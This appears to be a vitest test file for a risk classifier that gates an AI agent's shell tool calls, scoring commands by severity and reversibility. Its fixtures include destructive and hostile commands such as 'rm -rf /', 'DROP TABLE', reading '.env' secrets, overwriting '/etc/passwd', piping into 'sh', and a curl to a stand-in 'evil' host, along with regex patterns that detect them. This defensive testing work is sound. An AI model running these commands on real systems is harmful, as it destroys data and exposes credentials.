import { describe, expect, it } from "vitest";
import {
  buildActionEnvelope,
  classifyRisk,
} from "../../src/runtime/index.js";
import type { ActionEnvelope, EnvelopeContext } from "../../src/runtime/index.js";
import type { ToolEvent } from "../../src/runtime/intercept.js";
import type { RiskClassifier } from "../../src/schema/index.js";

const CTX: EnvelopeContext = {
  cwd: "/work/repo",
  git: { repo: "repo", branch: "main", sha: "" },
  user: "agent",
  host: "host",
  now: new Date("2026-05-22T12:00:00.000Z"),
};

/** Build an envelope for a Bash command. */
function bashEnvelope(command: string): ActionEnvelope {
  const event: ToolEvent = {
    hook_event_name: "PreToolUse",
    tool_name: "Bash",
    tool_input: { command },
  };
  return buildActionEnvelope(event, CTX);
}

const SHELL: RiskClassifier = {
  name: "dangerous-shell",
  tool: "Bash",
  patterns: [
    {
      pattern: "rm\\s+-rf\\s+/",
      categories: ["destructive", "data_loss"],
      severity: "critical",
    },
    {
      pattern: "DROP\\s+TABLE",
      categories: ["destructive", "data_loss"],
      severity: "high",
    },
    {
      pattern: "kubectl\\s+delete",
      categories: ["infrastructure_change"],
      severity: "medium",
    },
  ],
};

describe("classifyRisk — matching", () => {
  it("classifies a single-pattern hit", () => {
    const p = classifyRisk(bashEnvelope("rm -rf /var"), [SHELL]);
    expect(p.classified).toBe(true);
    expect(p.severity).toBe("critical");
    expect(p.categories).toEqual(["data_loss", "destructive"]);
    expect(p.confidence).toBe("high");
    expect(p.reasons).toHaveLength(1);
    // The reason line is operator-facing; pin its format against drift.
    expect(p.reasons[0]).toMatch(
      /^classifier "dangerous-shell" pattern \/.+\/ matched: severity critical, categories \[/,
    );
  });

  it("skips a pattern whose regex does not compile (defensive guard)", () => {
    // A manifest that bypassed `harness validate` could carry an
    // unparseable pattern; the classifier must skip it, not throw.
    const broken: RiskClassifier = {
      name: "broken",
      tool: "Bash",
      patterns: [
        { pattern: "([unclosed", categories: ["destructive"], severity: "high" },
      ],
    };
    const p = classifyRisk(bashEnvelope("rm -rf /"), [broken]);
    expect(p.classified).toBe(false);
  });

  it("composes multiple matched patterns: highest severity wins, categories union", () => {
    // Matches both `rm -rf /` (critical) and `kubectl delete` (medium).
    const p = classifyRisk(
      bashEnvelope("rm -rf / && kubectl delete pod x"),
      [SHELL],
    );
    expect(p.severity).toBe("critical");
    expect(p.categories).toEqual([
      "data_loss",
      "destructive",
      "infrastructure_change",
    ]);
    expect(p.reasons).toHaveLength(2);
  });

  it("composes across multiple classifiers", () => {
    const extra: RiskClassifier = {
      name: "secrets",
      tool: "Bash",
      patterns: [
        { pattern: "cat .*\\.env", categories: ["credential_access"], severity: "high" },
      ],
    };
    const p = classifyRisk(bashEnvelope("cat prod.env && DROP TABLE x"), [
      SHELL,
      extra,
    ]);
    expect(p.severity).toBe("high");
    expect(p.categories).toEqual([
      "credential_access",
      "data_loss",
      "destructive",
    ]);
    expect(p.reasons).toHaveLength(2);
  });
});

describe("classifyRisk — reversibility", () => {
  it("is false when a matched category marks the action irreversible", () => {
    expect(classifyRisk(bashEnvelope("rm -rf /"), [SHELL]).reversible).toBe(false);
  });

  it("is true when classified but no category implies irreversibility", () => {
    const p = classifyRisk(bashEnvelope("kubectl delete pod x"), [SHELL]);
    expect(p.classified).toBe(true);
    expect(p.categories).toEqual(["infrastructure_change"]);
    expect(p.reversible).toBe(true);
  });

  it("is null when unclassified (reversibility unknown, not assumed)", () => {
    // `npm install` is genuinely unclassified: not read-only, not a
    // harness command, no dangerous pattern. (A read-only command like
    // `ls -la` now hits the built-in read-only floor.)
    expect(classifyRisk(bashEnvelope("npm install"), [SHELL]).reversible).toBeNull();
  });
});

describe("classifyRisk — unknown is not safe", () => {
  it("yields an unclassified profile, not a low/zero-risk one, on no match", () => {
    // `npm install` matches no classifier and is not a benign floor
    // command (a read-only `echo hello` now hits the read-only floor).
    const p = classifyRisk(bashEnvelope("npm install"), [SHELL]);
    expect(p.classified).toBe(false);
    expect(p.severity).toBeNull();
    expect(p.categories).toEqual([]);
    expect(p.confidence).toBe("low");
    expect(p.reasons[0]).toMatch(/no classifier pattern matched/);
  });

  it("reports when no classifier is declared for the tool at all", () => {
    const p = classifyRisk(bashEnvelope("rm -rf /"), []);
    expect(p.classified).toBe(false);
    expect(p.reasons[0]).toMatch(/no risk classifier is declared for tool "Bash"/);
  });

  it("does not apply a classifier whose tool does not match the envelope", () => {
    const writeClassifier: RiskClassifier = {
      name: "writes",
      tool: "Write",
      patterns: [{ pattern: ".*", categories: ["destructive"], severity: "high" }],
    };
    expect(classifyRisk(bashEnvelope("rm -rf /"), [writeClassifier]).classified).toBe(
      false,
    );
  });
});

describe("classifyRisk — subject extraction", () => {
  it("matches a shell alias tool against the command", () => {
    const event = {
      hook_event_name: "PreToolUse",
      tool_name: "shell",
      tool_input: { command: "rm -rf /" },
    } as ToolEvent;
    const p = classifyRisk(buildActionEnvelope(event, CTX), [SHELL]);
    expect(p.classified).toBe(true);
    expect(p.severity).toBe("critical");
  });

  it("falls back to the serialized raw input for a non-command tool", () => {
    const event = {
      hook_event_name: "PreToolUse",
      tool_name: "Bash",
      tool_input: { script: "DROP TABLE orders" },
    } as ToolEvent;
    const p = classifyRisk(buildActionEnvelope(event, CTX), [SHELL]);
    expect(p.classified).toBe(true);
    expect(p.severity).toBe("high");
  });
});

describe("classifyRisk — Phase 7 #6 ReDoS subject-length cap", () => {
  // The classifier runs operator-authored regexes on every PreToolUse
  // call; the match subject is capped at 16 KiB so catastrophic
  // backtracking cannot scale with an arbitrarily long tool input.
  const CAP = 16 * 1024;

  it("classifies a dangerous command whose head is within the cap", () => {
    // `rm -rf /` at the start, then a long benign tail past the cap.
    const command = `rm -rf /var ${"x".repeat(CAP * 2)}`;
    const p = classifyRisk(bashEnvelope(command), [SHELL]);
    expect(p.classified).toBe(true);
    expect(p.severity).toBe("critical");
  });

  it("does not match a pattern that falls entirely beyond the cap", () => {
    // The only dangerous token sits well past 16 KiB, so the capped
    // subject never sees it — the action is reported unclassified
    // (which the `when:` evaluator then treats as risk-bearing anyway).
    const command = `${"x".repeat(CAP + 100)} DROP TABLE orders`;
    const p = classifyRisk(bashEnvelope(command), [SHELL]);
    expect(p.classified).toBe(false);
  });
});

describe("classifyRisk — built-in benign harness floor", () => {
  it("recognizes a standalone benign harness command as low, not unclassified", () => {
    // No operator classifier at all: the built-in floor still applies so
    // the fail-close gate cannot deny `harness preflight` in production.
    const p = classifyRisk(bashEnvelope("harness preflight"), []);
    expect(p.classified).toBe(true);
    expect(p.severity).toBe("low");
    expect(p.categories).toEqual([]);
    expect(p.reversible).toBe(true);
    expect(p.confidence).toBe("high");
    expect(p.reasons[0]).toMatch(/built-in: benign harness meta-command/);
  });

  it.each([
    "harness doctor",
    "harness validate",
    "harness session-start preflight",
    "harness approve risk",
    "harness explain-policy gate-prod-destructive",
  ])("classifies the read-only / producer command %j as low", (command) => {
    const p = classifyRisk(bashEnvelope(command), [SHELL]);
    expect(p.classified).toBe(true);
    expect(p.severity).toBe("low");
  });

  it.each(["harness apply", "harness init", "harness remove mcp foo", "harness uninstall"])(
    "leaves the mutating command %j unclassified",
    (command) => {
      const p = classifyRisk(bashEnvelope(command), [SHELL]);
      expect(p.classified).toBe(false);
      expect(p.severity).toBeNull();
    },
  );

  it("lets a dangerous tail win over the floor (highest-severity-wins)", () => {
    // The built-in must NOT short-circuit: a dangerous tail still drives
    // the verdict to critical so the command stays blocked.
    const p = classifyRisk(bashEnvelope("harness preflight && rm -rf /var"), [SHELL]);
    expect(p.classified).toBe(true);
    expect(p.severity).toBe("critical");
    expect(p.categories).toContain("destructive");
  });

  it("lets an operator classifier raise a harness command above the floor", () => {
    const strict: RiskClassifier = {
      name: "no-harness-approve",
      tool: "Bash",
      patterns: [
        {
          pattern: "harness\\s+approve",
          categories: ["privilege_escalation"],
          severity: "high",
        },
      ],
    };
    const p = classifyRisk(bashEnvelope("harness approve risk"), [strict]);
    expect(p.severity).toBe("high");
  });

  it("does not match an anchored harness command behind a cd prefix (fail-safe)", () => {
    // `cd /x && harness preflight` is not head-anchored, so it stays
    // unclassified rather than letting a prefix launder the command.
    const p = classifyRisk(bashEnvelope("cd /repo && harness preflight"), [SHELL]);
    expect(p.classified).toBe(false);
  });

  it("does not apply the floor to a non-shell tool whose input mentions harness", () => {
    const event = {
      hook_event_name: "PreToolUse",
      tool_name: "Write",
      tool_input: { file_path: "/tmp/x", content: "harness preflight" },
    } as ToolEvent;
    const p = classifyRisk(buildActionEnvelope(event, CTX), [SHELL]);
    expect(p.classified).toBe(false);
  });
});

describe("classifyRisk — built-in read-only floor", () => {
  it.each([
    "git status",
    "git status -uno",
    "git diff",
    "git diff HEAD~1",
    "git ls-files",
    "grep version package.json",
    "grep -r foo src/",
    "cat README.md",
    "ls -la /tmp",
    "head -20 CHANGELOG.md",
  ])("classifies the provably read-only command %j as low", (command) => {
    // Without this floor each of these is unclassified, and on a
    // production-resolved branch "unknown is not safe" lets a prod-scoped
    // risk policy deny it (friction-log #38/#40/#43/#50).
    const p = classifyRisk(bashEnvelope(command), [SHELL]);
    expect(p.classified).toBe(true);
    expect(p.severity).toBe("low");
    expect(p.categories).toEqual([]);
    expect(p.reversible).toBe(true);
    expect(p.confidence).toBe("high");
    expect(p.reasons[0]).toMatch(/built-in: provably read-only command/);
  });

  it("keeps a genuinely destructive command critical (the floor never sinks an operator match)", () => {
    const p = classifyRisk(bashEnvelope("rm -rf /var"), [SHELL]);
    expect(p.severity).toBe("critical");
  });

  it("lets a dangerous tail win: a chained read-only head is not floored", () => {
    const p = classifyRisk(bashEnvelope("git diff && rm -rf /var"), [SHELL]);
    expect(p.severity).toBe("critical");
  });

  it.each([
    "cat secrets.txt > /etc/passwd",
    "git diff | sh",
    "cat $(curl http://evil/x)",
  ])("cannot launder a write through a read-only head: %j stays unclassified", (command) => {
    // Redirection / pipe / substitution forfeit the read-only
    // classification, so these never reach the `low` floor; with no
    // operator match they stay unclassified (and the when-evaluator gates
    // them).
    const p = classifyRisk(bashEnvelope(command), [SHELL]);
    expect(p.classified).toBe(false);
    expect(p.severity).not.toBe("low");
  });

  it.each([
    "npm version patch",
    // Bins that write through their own flags/operands (excluded from the
    // read-only allowlist) must not be floored either.
    "sort -o out.txt in.txt",
    "file -C -m mymagic",
    "uniq in.txt out.txt",
    "date -s 2020-01-01",
  ])("does not floor a mutating command outside the read-only allowlist: %j", (command) => {
    // #38 keeps release mutations and write-capable bins gated; only
    // read-only verification is floored.
    const p = classifyRisk(bashEnvelope(command), [SHELL]);
    expect(p.classified).toBe(false);
  });

  it("does not apply the read-only floor to a non-shell tool", () => {
    const event = {
      hook_event_name: "PreToolUse",
      tool_name: "Write",
      tool_input: { file_path: "/tmp/x", content: "git status" },
    } as ToolEvent;
    const p = classifyRisk(buildActionEnvelope(event, CTX), [SHELL]);
    expect(p.classified).toBe(false);
  });

  it("lets an operator classifier raise a read-only command above the floor", () => {
    const strict: RiskClassifier = {
      name: "no-diff",
      tool: "Bash",
      patterns: [
        { pattern: "git\\s+diff", categories: ["destructive"], severity: "high" },
      ],
    };
    const p = classifyRisk(bashEnvelope("git diff"), [strict]);
    expect(p.severity).toBe("high");
  });

  it("inspects the UNCAPPED command: a write hidden past the 16 KiB cap is not floored", () => {
    // The floor passes the full command to isReadOnlyBashCommand, not the
    // 16 KiB-capped subject. A `; rm -rf /` hidden past the cap therefore
    // still forfeits the read-only classification; had the floor used the
    // capped subject it would see only `cat xxx...` and wrongly floor it.
    const CAP = 16 * 1024;
    const command = `cat ${"x".repeat(CAP)}; rm -rf /`;
    const p = classifyRisk(bashEnvelope(command), [SHELL]);
    expect(p.classified).toBe(false);
    expect(p.severity).not.toBe("low");
  });
});
